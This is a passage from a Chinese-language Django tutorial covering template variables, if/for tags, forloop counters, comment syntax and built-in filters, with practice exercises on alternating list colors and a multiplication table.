<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #a020f0;">from</span> datetime <span style="color: #a020f0;">import</span> datetime

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21709;&#24212;&#25253;&#25991;&#27491;&#25991;&#37096;&#20998;&#30340;&#23383;&#31526;&#20018;&#21487;&#20197;&#21160;&#24577;&#29983;&#25104;&#65292;&#20063;&#21487;&#20197;&#20174;&#25991;&#20214;&#20013;&#35835;&#21462;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21160;&#24577;&#29983;&#25104;&#23601;&#26159;&#22312;&#20869;&#23384;&#29983;&#25104;&#19968;&#20010;&#24453;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;&#30340;HTML&#30340;&#23383;&#31526;&#20018;</span>
    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'a'</span>:100,
        <span style="color: #8b2252;">'b'</span>:0,
        <span style="color: #8b2252;">'c'</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(10,20)),
        <span style="color: #8b2252;">'d'</span>:<span style="color: #483d8b;">dict</span>(<span style="color: #483d8b;">zip</span>(<span style="color: #8b2252;">'abcde'</span>,<span style="color: #8b2252;">'ABCDE'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">d.e &#27809;&#25214;&#21040; d['e'] &#27809;&#25214;&#21040; d[e]</span>
        <span style="color: #8b2252;">'s'</span>:<span style="color: #8b2252;">'abcde'</span>,
        <span style="color: #8b2252;">'date'</span>:datetime.now(),
    }
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, {<span style="color: #8b2252;">'mydict'</span>: context} , status=201)

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"viewport"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"width=device-width, initial-scale=1.0"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">&#31532;&#19968;&#20010;&#27169;&#26495;&#25991;&#20214;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
{{ mydict.a }} &lt;<span style="color: #0000ff;">br</span>&gt; 
{{mydict.c}} | {{ mydict.d }}&lt;<span style="color: #0000ff;">hr</span>&gt;
{{ mydict.d.e }} {{ mydict.c.0 }}&lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.keys }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.values }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.items }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.s.1 }} [{{ mydict.t.0 }}]
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d67e337e-ccd0-401b-b7f9-98941b6ce67b" class="outline-4">
<h4 id="h:d67e337e-ccd0-401b-b7f9-98941b6ce67b">模板标签</h4>
<div class="outline-text-4" id="text-h:d67e337e-ccd0-401b-b7f9-98941b6ce67b">
<p>
标签采用 {% tag %} 语法
</p>

<p>
<b>if/else标签</b>
</p>

<p>
基本语法如下：
</p>

<div class="org-src-container">
<pre class="src src-txt">{% if condition %}
    ... display
{% endif %}
</pre>
</div>

<p>
或者
</p>
<div class="org-src-container">
<pre class="src src-txt">{% if condition %}
    ... display 1
{% elif condition2 %}
    ... display 2
{% else %}
    ... display 3
{% endif %}
</pre>
</div>

<p>
条件也支持and、or、not
</p>

<p>
注意,因为这些标签是断开的，所以不能像Python一样使用缩进就可以表示出来，必须有个结束标签，例如endif、endfor。
</p>

<p>
<b>for标签</b>
</p>
<ul class="org-ul">
<li>文档：<a href="https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#for">https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#for</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Django web &#27169;&#26495;&#25216;&#26415;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&#25105;&#26159;&#27169;&#26495;&#65292;&#25968;&#25454;&#26159;{{content}}

&lt;<span style="color: #0000ff;">ul</span>&gt;
{% for athlete in athlete_list  %}
    &lt;<span style="color: #0000ff;">li</span>&gt;{{ athlete.name }}&lt;/<span style="color: #0000ff;">li</span>&gt;
{% endfor %}
&lt;/<span style="color: #0000ff;">ul</span>&gt;

&lt;<span style="color: #0000ff;">ul</span>&gt;
{% for person in person_list %}
    &lt;<span style="color: #0000ff;">li</span>&gt; {{ person.name }}&lt;/<span style="color: #0000ff;">li</span>&gt;
{% endfor %}
&lt;/<span style="color: #0000ff;">ul</span>&gt;
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">变量</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">forloop.counter</td>
<td class="org-left">当前循环从1开始的计数</td>
</tr>

<tr>
<td class="org-left">forloop.counter0</td>
<td class="org-left">当前循环从0开始的计数</td>
</tr>

<tr>
<td class="org-left">forloop.revcounter</td>
<td class="org-left">从循环的末尾开始倒计数1</td>
</tr>

<tr>
<td class="org-left">forloop.revcounter0</td>
<td class="org-left">从循环的末尾开始倒计数到0</td>
</tr>

<tr>
<td class="org-left">forloop.first</td>
<td class="org-left">第一次进入循环</td>
</tr>

<tr>
<td class="org-left">forloop.last</td>
<td class="org-left">最后一次进入循环</td>
</tr>

<tr>
<td class="org-left">forloop.parentloop</td>
<td class="org-left">循环嵌套时，内层当前循环的外层循环</td>
</tr>
</tbody>
</table>

<p>
给标签增加一个reversed使得该列表被反向迭代:
</p>

<div class="org-src-container">
<pre class="src src-html">{% for athlete in athlete_list reversed %}
...
{% empty %}
... &#22914;&#26524;&#34987;&#36845;&#20195;&#30340;&#21015;&#34920;&#26159;&#31354;&#30340;&#25110;&#32773;&#19981;&#23384;&#22312;&#65292;&#25191;&#34892;empty
{% endfor %}
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">blog/urls.py</span>
...
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):

    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'a'</span>:100,
        <span style="color: #8b2252;">'b'</span>:0,
        <span style="color: #8b2252;">'c'</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(10,20)),
        <span style="color: #8b2252;">'d'</span>:<span style="color: #483d8b;">dict</span>(<span style="color: #483d8b;">zip</span>(<span style="color: #8b2252;">'abcde'</span>,<span style="color: #8b2252;">'ABCDE'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">d.e &#27809;&#25214;&#21040; d['e'] &#27809;&#25214;&#21040; d[e]</span>
        <span style="color: #8b2252;">'s'</span>:<span style="color: #8b2252;">'abcde'</span>,
        <span style="color: #8b2252;">'date'</span>:datetime.now(),
    }
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, {<span style="color: #8b2252;">'mydict'</span>:context}, status=201)
...
</pre>
</div>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"viewport"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"width=device-width, initial-scale=1.0"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">&#31532;&#19968;&#20010;&#27169;&#26495;&#25991;&#20214;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
{{ mydict.a }} &lt;<span style="color: #0000ff;">br</span>&gt; 
{{mydict.c}} | {{ mydict.d }}&lt;<span style="color: #0000ff;">hr</span>&gt;
{{ mydict.d.e }} {{ mydict.c.0 }}&lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.keys }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.values }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.d.items }} &lt;<span style="color: #0000ff;">br</span>&gt;
{{ mydict.s.1 }} [{{ mydict.t.0 }}]
&lt;<span style="color: #0000ff;">hr</span>&gt;

&lt;<span style="color: #0000ff;">style</span>&gt;
    ul .ulred{color:red}
    ul .ulgreen{color:green}
&lt;/<span style="color: #0000ff;">style</span>&gt;
&lt;<span style="color: #0000ff;">ul</span>&gt;
    {% for x in mydict.c  reversed %}
        &lt;<span style="color: #0000ff;">li</span>&gt;{{ forloop.counter }} - {{ forloop.counter0 }} - 
            {{ forloop.revcounter }} - {{ forloop.revcounter0 }}
            {{ x }}&lt;<span style="color: #0000ff;">br</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
    {% empty %}
    &lt;<span style="color: #0000ff;">li</span>&gt;empty&#31354;&lt;/<span style="color: #0000ff;">li</span>&gt;
    {% endfor %}
&lt;/<span style="color: #0000ff;">ul</span>&gt;
&lt;<span style="color: #0000ff;">hr</span>&gt; <span style="color: #b22222;">&lt;!--</span><span style="color: #b22222;">&#23383;&#20856;&#36941;&#21382;</span><span style="color: #b22222;">--&gt;</span>
{% for k,v in mydict.d.items %}
{{ k }} {{ v }} &lt;<span style="color: #0000ff;">br</span>&gt;
{% endfor%}
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>


<figure id="org228e94f">
<img src="https://raw.githubusercontent.com/jaspervincent/webimage/master/python/images/img_20250616_112911.png" alt="img_20250616_112911.png" width="50%">

</figure>


<p>
可以嵌套使用{% for %}标签：
</p>

<div class="org-src-container">
<pre class="src src-html">{% for athlete in athlete_list %}
    &lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">{{ athlete.name }}</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
    &lt;<span style="color: #0000ff;">ul</span>&gt;
    &lt;% for sport in athlete.sports_played %&gt;
        &lt;<span style="color: #0000ff;">li</span>&gt;{{ sport }}&lt;/<span style="color: #0000ff;">li</span>&gt;
    &lt;% endfor %&gt;
    &lt;/<span style="color: #0000ff;">ul</span>&gt;
{% endfor %}
</pre>
</div>


<p>
<b>ifequel/ifnotequal标签</b>
</p>
<ul class="org-ul">
<li>{% ifequal %}标签比较两个值，当他们相等时，显示在{% ifequal %}和{% endifequal %}之中所有的值。下面的例子比较两个模板变量user和currentuser:</li>
</ul>

<div class="org-src-container">
<pre class="src src-html">{% ifequal user currentuser %}
    &lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Welcome!</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
{% endifequal %}
</pre>
</div>

<ul class="org-ul">
<li>和{% if %}类似，{% ifequal %}支持可选的{% else %}标签：</li>
</ul>

<div class="org-src-container">
<pre class="src src-html">{% ifequal section 'sitenews' %}
    &lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Site News</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
{% else %}
    &lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">No News Here</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
{% endifequal %}
</pre>
</div>

<p>
其他标签
</p>
<ul class="org-ul">
<li>csrf_token用于跨站请求伪造保护，防止跨站攻击的。{% csrf_token %}
<ul class="org-ul">
<li>header头增加了set-cookie</li>
<li>正文增加了隐藏表单选项</li>
</ul></li>
</ul>

<p>
<b>附加&#x2013;Pycharm模板自定义</b>
</p>

<ol class="org-ol">
<li>第一步：Settings&#x2013;&gt;Editor&#x2013;&gt;Live Templates</li>
<li><p>
第二步
</p>

<p>
如 for
</p>
<ul class="org-ul">
<li>Abbreviation: for</li>
<li><p>
Template text
</p>

<div class="org-src-container">
<pre class="src src-sh">{% for $<span style="color: #a0522d;">END</span>$%}
{% endfor %}
</pre>
</div></li>
</ul></li>

<li>第三步
<ul class="org-ul">
<li>Define: html 应用在html中</li>
<li>Option: Expand with: Tab  触发</li>
</ul></li>
</ol>
</div>
</div>
<div id="outline-container-h:42f5b44c-88bb-44d6-9028-da6e95ca631d" class="outline-4">
<h4 id="h:42f5b44c-88bb-44d6-9028-da6e95ca631d">注释标签</h4>
<div class="outline-text-4" id="text-h:42f5b44c-88bb-44d6-9028-da6e95ca631d">
<ul class="org-ul">
<li>单行注释 <code>{# #}</code></li>
<li>多行注释 <code>{% comment %}... {% endcomment %}</code></li>
</ul>

<div class="org-src-container">
<pre class="src src-html">{# &#36825;&#26159;&#19968;&#20010;&#27880;&#37322; #}

{% comment %}
&#36825;&#26159;&#22810;&#34892;&#27880;&#37322;
{% endcomment %}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cda8d276-bf3a-4d3e-8eff-77f769a823c3" class="outline-4">
<h4 id="h:cda8d276-bf3a-4d3e-8eff-77f769a823c3">过滤器</h4>
<div class="outline-text-4" id="text-h:cda8d276-bf3a-4d3e-8eff-77f769a823c3">
<p>
模板过滤器可以在遍历被显示前修改它。
</p>

<p>
语法 <code>{{ 变量|过滤器}}</code>
</p>
<ol class="org-ol">
<li>过滤器使用管道字符 <code>|</code> ,例如 <code>{{ name|lower}}</code> , <code>{{ name }}</code> 变量被过滤器lower处理后，文档大写转换文本为小写。</li>
<li>过滤管道可以被*套接*，一个过滤器管道的输出又可以作为下一个管道的输入。
<ul class="org-ul">
<li>例如 <code>{{ my_list|first|upper }}</code> ,将列表第一个元素并将其转化为大写。</li>
</ul></li>
<li><b>过滤器传参</b>
<ul class="org-ul">
<li>有些过滤器可以传递参数，过滤器的参数跟随冒号之后并且总是以双引号包含。</li>
<li>例如:
<ol class="org-ol">
<li><code>{{bio|truncatewords:"30"}}</code>,截取显示变量bio的前30个词。</li>
<li><code>{{ my_list|join:"," }}</code>,将my_list的所有元素使用=,=逗号连接起来</li>
</ol></li>
</ul></li>
</ol>

<p>
其他过滤器
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">过滤器</th>
<th scope="col" class="org-left">说明</th>
<th scope="col" class="org-left">举例</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">cut</td>
<td class="org-left">切掉字符串中的指定字符</td>
<td class="org-left">{{ value &vert; cut:"b"}}</td>
</tr>

<tr>
<td class="org-left">lower</td>
<td class="org-left">转换为小写</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">upper</td>
<td class="org-left">转换为大写</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">truncatewords</td>
<td class="org-left">指定的长度截取字符串</td>
<td class="org-left">{{ bio &vert; truncatewords:"30"}}</td>
</tr>

<tr>
<td class="org-left">join</td>
<td class="org-left">对序列拼接</td>
<td class="org-left">{{ d.e &vert; join:"//"}}</td>
</tr>

<tr>
<td class="org-left">first取序列第一个元素</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">last</td>
<td class="org-left">取序列最后元素</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">yesno</td>
<td class="org-left">变量可以是True、False、None</td>
<td class="org-left">{{value &vert; yesno:"yeah,no,maybe"}}</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">yesno的参数给定逗号分隔的三个值，</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">返回3个值中的一个。True对应第一个</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">False对应第二个</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">None对应第三个</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">如果参数只有2个，None等效False处理</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">add</td>
<td class="org-left">加法，参数是负数就是减法</td>
<td class="org-left">数字加{{value  &vert; add:"100"}} 列表合并{{mylist &vert; add:newlist}}</td>
</tr>

<tr>
<td class="org-left">divisibleby</td>
<td class="org-left">能否被整除</td>
<td class="org-left">{{value  &vert; divisibleby:"3" }}能被3整除返回True</td>
</tr>

<tr>
<td class="org-left">addslashes</td>
<td class="org-left">在反斜杠、单引号或者双引号前面加上反斜杠</td>
<td class="org-left">{{value   &vert; addslashes }}</td>
</tr>

<tr>
<td class="org-left">length</td>
<td class="org-left">返回变量的长度</td>
<td class="org-left">{% if my_list  &vert;} length &gt;1 %}</td>
</tr>

<tr>
<td class="org-left">default</td>
<td class="org-left">变量等价False则使用缺省值</td>
<td class="org-left">{{value &vert; default:"nothing"}}</td>
</tr>

<tr>
<td class="org-left">default_if_none</td>
<td class="org-left">变量为None使用缺省值</td>
<td class="org-left">{{value &vert; default_if_none:"nothing"}}</td>
</tr>

<tr>
<td class="org-left">date</td>
<td class="org-left">格式化date或者datetime对象</td>
<td class="org-left">实例：{{my_dict.date &vert; date:'Y n j'}}</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">Y 2000年, n 1-12月, j 1-31日</td>
</tr>
</tbody>
</table>

<ul class="org-ul">
<li>时间的格式字符查看<a href="https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#date">https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#date</a></li>
<li>过滤参考<a href="https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#join">https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#join</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">urls.py</span>
def index(request:WSGIRequest):
    context = {
        <span style="color: #8b2252;">'a'</span>:100,
        <span style="color: #8b2252;">'a1'</span>:None,
        <span style="color: #8b2252;">'b'</span>:0,
        <span style="color: #8b2252;">'c'</span>:list(range(10,20)),
        <span style="color: #8b2252;">'d'</span>:dict(zip(<span style="color: #8b2252;">'abcde'</span>,<span style="color: #8b2252;">'ABCDE'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">d.e &#27809;&#25214;&#21040; d['e'] &#27809;&#25214;&#21040; d[e]</span>
        <span style="color: #8b2252;">'s'</span>:<span style="color: #8b2252;">'abcde'</span>,
        <span style="color: #8b2252;">'s1'</span>:<span style="color: #8b2252;">'a  b c'</span>,
        <span style="color: #8b2252;">'c1'</span>:[<span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'ccc'</span>],
        <span style="color: #8b2252;">'date'</span>:datetime.now(),
    }
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, {<span style="color: #8b2252;">'mydict'</span>: context} , <span style="color: #a0522d;">status</span>=201)


<span style="color: #b22222;">#</span><span style="color: #b22222;">index.html</span>
{{  mydict.a | add:<span style="color: #8b2252;">'-20'</span> }}
{{ mydict.s |add:<span style="color: #8b2252;">'xyz'</span> }}
{{ mydict.s |length|add:1000 }}
{{ mydict.s |join:<span style="color: #8b2252;">','</span>|truncatechars:5|upper }}&lt;br&gt;
{{ mydict.s |join:<span style="color: #8b2252;">'.'</span>|cut:<span style="color: #8b2252;">'.'</span> }}
{{ mydict.s |join:<span style="color: #8b2252;">'.'</span>|cut:<span style="color: #8b2252;">'c'</span> }}
{{ mydict.s1 |cut:<span style="color: #8b2252;">' '</span> }}

{{ mydict.s |join:<span style="color: #8b2252;">'&lt;br&gt;'</span> }} &lt;br&gt;
{{ mydict.s |first }}
{{ mydict.s.0 }}
{{ mydict.c |last }}
{{ mydict.c }}
{{ mydict.c |length|add:-3 }} ***
&lt;hr&gt;
{{ mydict.c| add:mydict.c1 }}
&lt;hr&gt;
{{ mydict.b|yesno:<span style="color: #8b2252;">'1,2'</span> }}
&lt;br&gt;
{{ mydict.c1|length|divisibleby:3|yesno:<span style="color: #8b2252;">'can,cannot'</span> }}
{{ mydict.a1|default:<span style="color: #8b2252;">'&#32570;&#30465;&#20540;'</span>}}
{{ mydict.a1|default_if_none:<span style="color: #8b2252;">'&#32570;&#30465;&#20540;'</span>}}
&lt;hr&gt;
{{ mydict.date }}
{{ mydict.date|date:<span style="color: #8b2252;">'Y'</span> }}
{{ mydict.date|date:<span style="color: #8b2252;">'Y-m-d H:i:s'</span> }}

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#39029;&#38754;&#32467;&#26524;</span>
80 abcdexyz 1005 A,B,&#8230;
abcde a.b..d.e abc a
b
c
d
e
a a 19 [10, 11, 12, 13, 14, 15, 16, 17, 18, 19] 7 ***
[10, 11, 12, 13, 14, 15, 16, 17, 18, 19, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'ccc'</span>]
2
can &#32570;&#30465;&#20540; &#32570;&#30465;&#20540;
June 16, 2025, 5:22 p.m. 2025 2025-06-16 17:22:14
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:b29e3522-a78c-41be-86c1-6f9a0b305a22" class="outline-3">
<h3 id="h:b29e3522-a78c-41be-86c1-6f9a0b305a22">模板练习</h3>
<div class="outline-text-3" id="text-h:b29e3522-a78c-41be-86c1-6f9a0b305a22">
</div>
<div id="outline-container-h:da63fc89-2bef-4424-a8cd-7bcdb304e7e5" class="outline-4">
<h4 id="h:da63fc89-2bef-4424-a8cd-7bcdb304e7e5">1、奇偶行列表输出</h4>
<div class="outline-text-4" id="text-h:da63fc89-2bef-4424-a8cd-7bcdb304e7e5">
<p>
使用下面字典my_dict的c的列表，在模板网页中列表ul输出多行数据
</p>
<ul class="org-ul">
<li>要求奇偶行颜色不同</li>
<li>每行有行号(从1开始)</li>
<li>列表中所有数据都增大100</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse,HttpRequest,JsonResponse
<span style="color: #a020f0;">from</span> django.template <span style="color: #a020f0;">import</span> loader
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span>  render
<span style="color: #a020f0;">import</span> datetime

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #8b2252;">"""&#35270;&#22270;&#20989;&#25968;&#65306;&#35831;&#27714;&#36827;&#26469;&#36820;&#22238;&#21709;&#24212;"""</span>
    <span style="color: #a0522d;">mydict</span> = {
        <span style="color: #8b2252;">"a"</span>:100,
        <span style="color: #8b2252;">"b"</span>:0,
        <span style="color: #8b2252;">"c"</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(1,10)),
        <span style="color: #8b2252;">"d"</span>:<span style="color: #8b2252;">'abc'</span>,
        <span style="color: #8b2252;">"date"</span>:datetime.datetime.now(),
        <span style="color: #8b2252;">'matrix'</span>:[
            <span style="color: #8b2252;">"{}*{}={}"</span>.<span style="color: #483d8b;">format</span>(i,j, i*j)
            <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1,10)
            <span style="color: #a020f0;">for</span> j <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1,10)
        ]
       }
    <span style="color: #a0522d;">context</span> = {<span style="color: #8b2252;">"content"</span>:<span style="color: #8b2252;">"www.xxx.com"</span>,<span style="color: #8b2252;">"mydict"</span>:mydict}
    <span style="color: #a020f0;">return</span> render(request,<span style="color: #8b2252;">"index.html"</span>,context)
</pre>
</div>

<ul class="org-ul">
<li>模板页面</li>
</ul>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Django web &#27169;&#26495;&#25216;&#26415;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&lt;<span style="color: #0000ff;">ul</span>&gt;
    {% for line in mydict.c %}
    &lt;<span style="color: #0000ff;">li</span> <span style="color: #a0522d;">style</span>=<span style="color: #8b2252;">'color:{{forloop.counter|divisibleby:"2"|yesno:"red,green"}}'</span>&gt;
        &lt;<span style="color: #0000ff;">span</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">""</span>&gt;{{line|add:100}} &lt;/<span style="color: #0000ff;">span</span>&gt;
    &lt;/<span style="color: #0000ff;">li</span>&gt;
    {<span style="color: #a0522d;">%endfor</span>%}
&lt;/<span style="color: #0000ff;">ul</span>&gt;
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ea43aba3-70e9-4a07-ae00-e526f8e45060" class="outline-4">
<h4 id="h:ea43aba3-70e9-4a07-ae00-e526f8e45060">2、打印九九方阵, 自定义模板一些使用方法</h4>
<div class="outline-text-4" id="text-h:ea43aba3-70e9-4a07-ae00-e526f8e45060">
<div class="org-src-container">
<pre class="src src-sh">1*<span style="color: #a0522d;">1</span>=1 1*<span style="color: #a0522d;">2</span>=2 ... 1*<span style="color: #a0522d;">9</span>=9
...
9*<span style="color: #a0522d;">1</span>=9 9*<span style="color: #a0522d;">2</span>=18.. 9*<span style="color: #a0522d;">9</span>=81
</pre>
</div>

<p>
